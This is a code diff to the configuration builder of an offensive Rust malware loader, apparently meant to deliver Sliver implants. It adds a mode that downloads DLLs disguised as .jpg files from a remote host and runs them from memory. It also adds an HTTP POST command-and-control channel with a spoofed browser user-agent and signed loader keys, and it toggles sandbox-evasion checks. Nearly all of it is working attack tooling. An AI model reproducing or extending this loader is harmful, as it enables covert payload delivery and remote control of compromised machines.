@@ -2,13 +2,14 @@ extern crate argparse;
 
 use malleable_rust_loader::config::Config;
 use malleable_rust_loader::dataoperation::DataOperation;
-use malleable_rust_loader::defuse::CheckInternet;
+//use malleable_rust_loader::defuse::CheckInternet;
 use malleable_rust_loader::defuse::Defuse;
 use malleable_rust_loader::defuse::DomainJoin;
 use malleable_rust_loader::defuse::Hostname;
 use malleable_rust_loader::defuse::Operator;
 use malleable_rust_loader::link::FileLink;
 use malleable_rust_loader::link::HTTPLink;
+use malleable_rust_loader::link::HTTPPostC2Link;
 use malleable_rust_loader::link::Link;
 use malleable_rust_loader::link::MemoryLink;
 use malleable_rust_loader::payload::DllFromMemory;
@@ -41,10 +42,13 @@ fn fromfile_master_keypair(path_file: &str) -> Ed25519KeyPair {
 
 fn main() {
     env_logger::init();
+    let mut link_timeout: u64 = 10;
+    let mut link_user_agent: String ="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0".to_string();
     let mut verbose = false;
     let mut payload = "".to_string();
     let mut output: String = concat!(env!("HOME"), "/.malleable/config/initial.json").to_string();
     let mut keypair: String = concat!(env!("HOME"), "/.malleable/ed25519.u8").to_string();
+    let mut loader_keypair: String = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
     let mut payload_dataope: String =
         concat!(env!("HOME"), "/.malleable/payload/sliver.dll.dataop").to_string();
     {
@@ -60,7 +64,10 @@ fn main() {
             "config output path, default: /.malleable/config/initial.json",
         );
         ap.refer(&mut keypair).add_option(&["--keypair"], Store,"path of your private ed25519 key pair to sign configuration, default: ~/.malleable/ed25519.u8)");
+        ap.refer(&mut loader_keypair).add_option(&["--keypair"], Store,"path of the loader private ed25519 key pair to send authenticated data with HTTPPostC2Link, default: ~/.malleable/config/ed25519.u8)");
         ap.refer(&mut payload_dataope).add_option(&["--payload-dataop"], Store,"path of the payload dataoperations (needed for AEAD because it require cryptmaterial), default: ~/.malleable/payload/sliver.dll.dataop");
+        ap.refer(&mut link_timeout).add_option(&["--link-timeout"], Store,"global timeout for link");
+        ap.refer(&mut link_user_agent).add_option(&["--link-user-agent"], Store,"global user-agent for link");
         ap.parse_args_or_exit();
     }
     let json_file = format!("{output}");
@@ -104,6 +111,32 @@ fn main() {
             dll_entrypoint: String::from("DllInstall"),
             thread: true,
         })];
+    } else if payload == "2dll".to_string() {
+        info!("[+] Loader type choice: DllFromMemory [AEAD]");
+        let payload_dataoperation: Vec<DataOperation> =
+            serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
+        payload_choice = vec![
+            Payload::DllFromMemory(DllFromMemory {
+            link: Link::HTTP(HTTPLink {
+                url: String::from("https://kaboum.xyz/artdonjon/donjon_dll.jpg"),
+                dataoperation: payload_dataoperation.clone(),
+                jitt: 0,
+                sleep: 0,
+            }),
+            dll_entrypoint: String::from("DllInstall"),
+            thread: true,
+            }),
+            Payload::DllFromMemory(DllFromMemory {
+                link: Link::HTTP(HTTPLink {
+                    url: String::from("https://kaboum.xyz/artdonjon/donjon_dll2.jpg"),
+                    dataoperation: payload_dataoperation,
+                    jitt: 0,
+                    sleep: 0,
+                }),
+                dll_entrypoint: String::from("DllInstall"),
+                thread: true,
+                }),
+            ];
     } else if payload == "py".to_string() {
         info!("[+] Loader type choice: ExecPython");
         payload_choice = vec![
@@ -150,13 +183,13 @@ exec(decoded_script)
             serde_json::from_slice(&fs::read(&payload_dataope).unwrap()).unwrap();
         payload_choice = vec![Payload::DllFromMemory(DllFromMemory {
             link: Link::MEMORY(MemoryLink {
-                memory_nb: 1,
+                memory_nb: 4,
                 dataoperation: payload_dataoperation,
                 jitt: 0,
                 sleep: 0,
             }),
             dll_entrypoint: String::from("DllInstall"),
-            thread: true,
+            thread: false,
         })];
     } else if payload == "wstunnel".to_string() {
         // cp ~/wstunnel/target/x86_64-pc-windows-gnu/release/wstunnel.exe  ~/.malleable/payload/
@@ -212,6 +245,44 @@ exec(decoded_script)
         panic!()
     }
 
+    let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([(
+        1,
+        (
+            "postC2".to_string(),
+            PoolLinks {
+                pool_mode: PoolMode::ADVANCED(Advanced {
+                    random: 0,          // fetch only x random link from pool and ignore the other, (0 not set)
+                    max_link_broken: 0, // how many accepted link broken before switch to next pool if no conf found, (0 not set)
+                    parallel: true, // try to fetch every link in the same time, if not its one by one
+                    linear: true,   // fetch link in the order or randomized
+                    stop_same: false, // stop if found the same conf -> not for parallel
+                    stop_new: false, // stop if found a new conf -> not for parallel
+                    accept_old: false, // accept conf older than the active one -> true not recommended, need to fight against hypothetic valid config replay.
+                }),
+                pool_links: vec![        
+                /* 
+                Link::HTTPPostC2(HTTPPostC2Link {
+                        url: String::from("https://kaboum.xyz/admin/login.php"),
+                        dataoperation: vec![DataOperation::WEBPAGE,DataOperation::BASE64],
+                        dataoperation_post: vec![DataOperation::BASE64,DataOperation::BASE64],
+                        jitt: 0,
+                        sleep: 0,
+                    }),*/
+                    Link::HTTPPostC2(HTTPPostC2Link {
+                        url: String::from("http://192.168.56.1:3000/login.php"),
+                        //dataoperation: vec![DataOperation::BASE64],
+                        dataoperation: vec![DataOperation::BASE64,DataOperation::BASE64],
+                        dataoperation_post: vec![DataOperation::BASE64],
+                        jitt: 0,
+                        sleep: 0,
+                    }),
+
+                ],
+            },
+        ),
+    )]);
+
+    /*
     //let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::new();
     let pool_links: BTreeMap<u64, (String, PoolLinks)> = BTreeMap::from([
         (
@@ -294,6 +365,7 @@ exec(decoded_script)
             ),
         ),
     ]);
+    // */
 
     // payload is define, now, CREATE the
     info!("[+] LOAD ed25519 keypair from {:?}", keypair);
@@ -303,14 +375,15 @@ exec(decoded_script)
         &key_pair_ed25519,
         pool_links,
         payload_choice,
-        vec![Defuse::CheckInternet(CheckInternet {
+        vec![ /* Defuse::CheckInternet(CheckInternet {
             list: vec![
                 "https://www.microsoft.com".to_string(),
                 "https://google.com".to_string(),
                 "https://login.microsoftonline.com".to_string(),
             ],
             operator: Operator::AND,
-        })],
+        }) */
+        ],
         vec![
             Defuse::Hostname(Hostname {
                 list: vec!["DEBUG-W10".to_string(), "DRACONYS".to_string()],
@@ -321,8 +394,11 @@ exec(decoded_script)
                 operator: Operator::AND,
             }),
         ],
-        60,
+        1,
         0,
+        link_timeout,
+        link_user_agent,
+        fs::read(loader_keypair).unwrap()
     );
     //info!("{:?}", loaderconf);
     info!("[+] SIGN loader");
